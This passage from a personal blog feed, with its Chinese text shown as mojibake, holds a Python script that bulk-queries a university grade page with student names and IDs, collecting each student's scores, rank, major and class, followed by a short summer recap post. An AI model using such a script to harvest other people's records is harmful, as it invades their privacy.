class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;å­¦å·&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;å§“å&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;ç«‹å³æŸ¥è¯¢&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;é—¨æ•°&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;å­¦åˆ†åŠ æƒå¹³å‡åˆ†&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;å­¦åˆ†åŠ æƒå¹³å‡åˆ†æ’å&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;ä¸“ä¸š&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;ç­çº§&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;å§“å&#x27;</span>, <span class="string">&#x27;å­¦å·&#x27;</span>, <span class="string">&#x27;é—¨æ•°&#x27;</span>, <span class="string">&#x27;å­¦åˆ†åŠ æƒå¹³å‡åˆ†&#x27;</span>, <span class="string">&#x27;å­¦åˆ†åŠ æƒå¹³å‡åˆ†æ’å&#x27;</span>, <span class="string">&#x27;ä¸“ä¸š&#x27;</span>, <span class="string">&#x27;ç­çº§&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>pythonåªæ˜¯ç”¨æ¥å¨±ä¹ï¼Œç”Ÿäº§åŠ›è¿˜å¾—æ˜¯c++!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘è¿·ä¸Šäº†pythonï¼Œå„ç§èŠ±é‡Œèƒ¡å“¨çš„åº“ä¹Ÿå¤ªå¥½ç©äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¤©å¯¼å‘˜å‘äº†ä¸ªæŸ¥æˆç»©çš„é€šçŸ¥ï¼Œå¤–åŠ äº†é“¾æ¥ï¼Œä¸€ä¸ªå¾ˆç®€å•çš„ç½‘é¡µï¼Œè¾“å…¥å­¦å·å§“åå°±</summary>
      
    
    
    
    <category term="pythonå®è·µ" scheme="http://haorical.xyz/categories/python%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>æš‘å‡æ€»ç»“</title>
    <link href="http://haorical.xyz/posts/123f4dc2/"/>
    <id>http://haorical.xyz/posts/123f4dc2/</id>
    <published>2021-09-22T13:56:03.000Z</published>
    <updated>2021-09-23T13:58:39.437Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸çŸ¥ä¸è§‰æš‘å‡ç»“æŸäº†ï¼Œè¿™ä¸¤å¤©å†™å®Œå®ä¹ æŠ¥å‘Šç»ˆäºæœ‰æ—¶é—´èƒ½ç®€å•çš„æ€»ç»“ä¸€ä¸‹äº†ã€‚</p><ul><li><p>pythonå…¥é—¨åˆ°ç²¾é€š</p></li><li><p>æ•°å­¦å»ºæ¨¡å­¦äº†ä¸€ç‚¹ç‚¹ï¼ŒmatlabåŸºæœ¬æ˜¯ä¼šç”¨äº†</p></li><li><p>ctfæŠŠbugkuä¸Šçš„webåˆ·å®Œäº†ï¼Œæ­£åœ¨åˆ·buuï¼Œå­¦çš„ä¸œè¥¿è¿˜æŒºå¤šçš„ï¼Œä¹Ÿæ‰“äº†å‡ æ¬¡çº¿ä¸Šï¼Œæ„Ÿè§‰å¥½éš¾ï¼Œé“é˜»ä¸”é•¿</p></li><li><p>æŠ˜è…¾æœåŠ¡å™¨ï¼Œæ­å»ºäº†ç§æœ‰äº‘</p></li><li><p>linux ä½¿ç”¨çš„æ›´ç†Ÿç»ƒäº†ï¼ŒåŒ…æ‹¬dockeräº†ç­‰ç­‰</p></li><li><p>å­¦ä¼šäº†gitä½¿ç”¨å¤–åŠ GitHubï¼Œä¹‹å‰ä¸æ˜¯å¾ˆä¼š</p></li><li><p>æ´›å…‹ç‹å›½å¤©æ¢¯æ‰“åˆ°äº†é«˜çº§æ®µä½</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸çŸ¥ä¸è§‰æš‘å‡ç»“æŸäº†ï¼Œè¿™ä¸¤å¤©å†™å®Œå®ä¹ æŠ¥å‘Šç»ˆäºæœ‰æ—¶é—´èƒ½ç®€å•çš„æ€»ç»“ä¸€ä¸‹äº†ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;pythonå…¥é—¨åˆ°ç²¾é€š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ•°å­¦å»ºæ¨¡å­¦äº†ä¸€ç‚¹ç‚¹ï¼ŒmatlabåŸºæœ¬æ˜¯ä¼šç”¨äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ctfæŠŠbugkuä¸Šçš„webåˆ·å®Œäº†</summary>
      
    
    
    
    <category term="éšç¬”" scheme="http://haorical.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
</feed>
